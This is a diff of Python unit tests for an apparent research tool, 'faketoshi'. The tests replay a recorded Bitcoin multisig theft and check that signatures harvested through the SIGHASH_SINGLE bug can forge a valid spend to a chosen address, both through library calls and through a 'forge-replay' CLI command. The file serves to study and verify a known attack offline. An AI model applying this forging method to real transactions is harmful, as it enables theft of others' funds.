@@ -22,6 +22,7 @@ from faketoshi.sighash_single import (
     p2sh_script,
     replay_signature,
 )
+from faketoshi.signing import der_decode
 
 # The 2-of-3 keys used in the reference article (Copay/CVE-2025-29774 write-up).
 REFERENCE_KEYS = [
@@ -204,6 +205,172 @@ class ReplayTest(unittest.TestCase):
         self.assertEqual(result.script_sig, b'')
 
 
+
+class HistoryReplayTest(unittest.TestCase):
+    """The real BitPay/Copay theft transaction, verified offline.
+
+    Constants below are the on-chain facts: the transaction id, the victim and
+    attacker addresses, and the amount. If any of them change, the built-in
+    transaction no longer matches the chain and the test should fail.
+    """
+
+    EXPECTED_TXID = (
+        '791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf'
+    )
+    VICTIM = '32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe'
+    ATTACKER = '1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3'
+
+    def test_builtin_transaction_hashes_to_the_onchain_txid(self):
+        from faketoshi.sighash_single import replay_history
+
+        result = replay_history()
+        self.assertEqual(result.txid, self.EXPECTED_TXID)
+
+    def test_it_drained_the_victim_address_to_a_stranger(self):
+        from faketoshi.encoding import script_to_address
+        from faketoshi.sighash_single import replay_history
+
+        result = replay_history()
+        self.assertEqual(result.inputs, 3)
+        self.assertEqual(result.outputs, 1)
+        self.assertEqual(result.value_stolen, 5967200)  # 0.05967200 BTC
+        self.assertEqual(
+            script_to_address(result.transaction.outputs[0].script_pubkey, 'mainnet'),
+            self.ATTACKER,
+        )
+        self.assertEqual(result.victim_address, self.VICTIM)
+        self.assertEqual(
+            script_to_address(
+                b'\xa9\x14' + hash160(result.redeem_script) + b'\x87', 'mainnet'
+            ),
+            self.VICTIM,
+        )
+
+    def test_every_harvested_signature_hits_the_constant_digest(self):
+        from faketoshi.signing import SIGHASH_SINGLE_BUG_DIGEST
+        from faketoshi.sighash_single import replay_history
+
+        result = replay_history()
+        self.assertEqual(len(result.harvests), 4)  # 2 inputs x 2 signatures
+        for harvest in result.harvests:
+            self.assertEqual(harvest.digest, SIGHASH_SINGLE_BUG_DIGEST)
+            self.assertTrue(harvest.bug_triggered)
+
+    def test_the_signatures_come_from_distinct_multisig_keys(self):
+        from faketoshi.sighash_single import parse_multisig_redeem_script, replay_history
+
+        result = replay_history()
+        m, n, _ = parse_multisig_redeem_script(result.redeem_script)
+        self.assertEqual((m, n), (2, 3))
+        # A 2-of-3 needs two different keys to sign, so the harvest must cover
+        # at least two distinct key indices.
+        covered = {index for h in result.harvests for index in h.verifying_keys}
+        self.assertGreaterEqual(len(covered), m)
+
+    def test_sighash_all_would_have_committed_to_the_transaction(self):
+        from faketoshi.signing import SIGHASH_SINGLE_BUG_DIGEST
+        from faketoshi.sighash_single import replay_history
+
+        result = replay_history()
+        self.assertTrue(result.all_sighash_digests)
+        for digest in result.all_sighash_digests:
+            self.assertNotEqual(digest, SIGHASH_SINGLE_BUG_DIGEST)
+
+
+class ForgeFromHarvestTest(unittest.TestCase):
+    """Rebuild the theft: spend the coin from harvested signatures alone."""
+
+    def _forged(self):
+        from faketoshi.sighash_single import forge_from_harvest, replay_history
+
+        result = replay_history()
+        return forge_from_harvest(
+            result.harvests,
+            prev_txid='de' * 32,
+            prev_vout=0,
+            destination='1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9',
+            value=677200,
+        )
+
+    def test_forgery_is_valid_without_any_new_signature(self):
+        from faketoshi.signing import SIGHASH_SINGLE_BUG_DIGEST, decode_point, verify_z
+        from faketoshi.sighash_single import parse_multisig_redeem_script, parse_script_sig
+
+        forged = self._forged()
+        self.assertTrue(forged.valid)
+        self.assertEqual(forged.digest_used, SIGHASH_SINGLE_BUG_DIGEST)
+
+        tx = forged.transaction
+        items = [i for i in parse_script_sig(tx.inputs[1].script_sig) if i]
+        redeem = items[-1]
+        m, n, keys = parse_multisig_redeem_script(redeem)
+        self.assertEqual(m, 2)
+        # Each pushed signature verifies against its own key in the redeem script.
+        for blob, pubkey in zip(items[:-1], keys):
+            r, s, _ = der_decode(blob)
+            self.assertTrue(verify_z(decode_point(pubkey), r, s, forged.digest_used))
+
+    def test_forgery_pays_the_chosen_destination(self):
+        from faketoshi.encoding import script_to_address
+
+        forged = self._forged()
+        output = forged.transaction.outputs[0]
+        self.assertEqual(output.value, 677200 - 1000)
+        self.assertEqual(
+            script_to_address(output.script_pubkey, 'mainnet'),
+            '1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9',
+        )
+
+    def test_the_target_input_must_have_no_matching_output(self):
+        from faketoshi.sighash_single import forge_from_harvest, replay_history
+
+        result = replay_history()
+        forged = forge_from_harvest(
+            result.harvests, 'de' * 32, 0, '1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9', 677200
+        )
+        # Input 1 is spent with a single output -> index 1 has no output.
+        self.assertEqual(len(forged.transaction.inputs), 2)
+        self.assertEqual(len(forged.transaction.outputs), 1)
+
+    def test_insufficient_signatures_is_refused(self):
+        from faketoshi.sighash_single import forge_from_harvest, replay_history
+
+        result = replay_history()
+        # Keep only one of the two distinct keys.
+        only_key0 = [h for h in result.harvests if h.verifying_keys == [0]][:1]
+        with self.assertRaises(ValueError) as caught:
+            forge_from_harvest(
+                only_key0, 'de' * 32, 0, '1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9', 677200
+            )
+        self.assertIn('distinct keys', str(caught.exception))
+
+    def test_no_harvests_is_refused(self):
+        from faketoshi.sighash_single import forge_from_harvest
+
+        with self.assertRaises(ValueError):
+            forge_from_harvest([], 'de' * 32, 0, '1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9', 1000)
+
+
+class HarvestRejectsSafeTransactionsTest(unittest.TestCase):
+    def test_sighash_all_transaction_yields_nothing(self):
+        from faketoshi.sighash_single import harvest_signatures, replay_history
+
+        result = replay_history()
+        self.assertEqual(harvest_signatures(result.transaction, sighash_type=1), [])
+
+    def test_transaction_without_multisig_yields_nothing(self):
+        from faketoshi.signing import Transaction, TxIn, TxOut
+        from faketoshi.sighash_single import harvest_signatures
+
+        tx = Transaction(
+            version=2,
+            inputs=[TxIn('aa' * 32, 0, 0xFFFFFFFF, script_sig=b'\x00\x01\x02')],
+            outputs=[TxOut(1000, b'\x51')],
+            locktime=0,
+        )
+        self.assertEqual(harvest_signatures(tx), [])
+
+
 class CliTest(unittest.TestCase):
     def _run(self, argv):
         import contextlib
@@ -284,6 +451,98 @@ class CliTest(unittest.TestCase):
         rc, _, err = self._run(['decodesig', 'nothex'])
         self.assertEqual(rc, 2)
         self.assertIn('error:', err)
+
+
+
+class ReplayHistoryCliTest(unittest.TestCase):
+    def _run(self, argv):
+        import contextlib
+        import io
+
+        from faketoshi.__main__ import main
+
+        out, err = io.StringIO(), io.StringIO()
+        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
+            rc = main(argv)
+        return rc, out.getvalue(), err.getvalue()
+
+    def test_replay_history_prints_the_theft(self):
+        rc, out, err = self._run(['replay-history'])
+        self.assertEqual(rc, 0, err)
+        self.assertIn(HistoryReplayTest.EXPECTED_TXID, out)
+        self.assertIn('32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe', out)
+        self.assertIn('1Lyafe8mSqubnynbAWPcXbHE5pnHMzEnT3', out)
+        self.assertIn('0.05967200 BTC', out)
+
+    def test_replay_history_json(self):
+        import json
+
+        rc, out, _ = self._run(['replay-history', '--json'])
+        self.assertEqual(rc, 0)
+        payload = json.loads(out)
+        self.assertEqual(payload['txid'], HistoryReplayTest.EXPECTED_TXID)
+        self.assertEqual(payload['value_stolen'], 5967200)
+        self.assertEqual(payload['victim'], HistoryReplayTest.VICTIM)
+        self.assertEqual(payload['attacker'], HistoryReplayTest.ATTACKER)
+        self.assertEqual(len(payload['harvested']), 4)
+        for harvest in payload['harvested']:
+            self.assertEqual(harvest['digest'], str(SIGHASH_SINGLE_BUG_DIGEST))
+
+
+class ForgeReplayCliTest(unittest.TestCase):
+    def _run(self, argv):
+        import contextlib
+        import io
+
+        from faketoshi.__main__ import main
+
+        out, err = io.StringIO(), io.StringIO()
+        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
+            rc = main(argv)
+        return rc, out.getvalue(), err.getvalue()
+
+    BASE = [
+        'forge-replay',
+        '--txid', 'de' * 32,
+        '--vout', '0',
+        '--value', '677200',
+        '--to', '1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9',
+    ]
+
+    def test_forge_replay_produces_a_valid_spend(self):
+        rc, out, err = self._run(self.BASE)
+        self.assertEqual(rc, 0, err)
+        self.assertIn('harvested 4 signature(s)', out)
+        self.assertIn('valid: yes', out)
+        self.assertIn('not broadcast', out)
+
+    def test_forge_replay_json_matches_the_txid(self):
+        import json
+
+        rc, out, _ = self._run(self.BASE + ['--json'])
+        self.assertEqual(rc, 0)
+        payload = json.loads(out)
+        self.assertEqual(payload['value'], 677200 - 1000)
+        self.assertEqual(payload['destination'], '1Q1pE5vPGEEMqRcVRMbtBK842Y6Pzo6nK9')
+        self.assertEqual(payload['digest'], str(SIGHASH_SINGLE_BUG_DIGEST))
+        self.assertTrue(payload['valid'])
+        # The printed hex must be the transaction the reported txid describes.
+        from faketoshi.wallet import parse_transaction_hex
+
+        self.assertEqual(parse_transaction_hex(payload['hex']).txid(), payload['txid'])
+
+    def test_a_safe_transaction_has_nothing_to_harvest(self):
+        from faketoshi.signing import Transaction, TxIn, TxOut
+
+        safe = Transaction(
+            version=2,
+            inputs=[TxIn('aa' * 32, 0, 0xFFFFFFFF)],
+            outputs=[TxOut(1000, b'\x51')],
+            locktime=0,
+        )
+        rc, _, err = self._run(self.BASE + ['--from-tx', safe.hex()])
+        self.assertEqual(rc, 2)
+        self.assertIn('nothing to replay', err)
 
 
 if __name__ == '__main__':
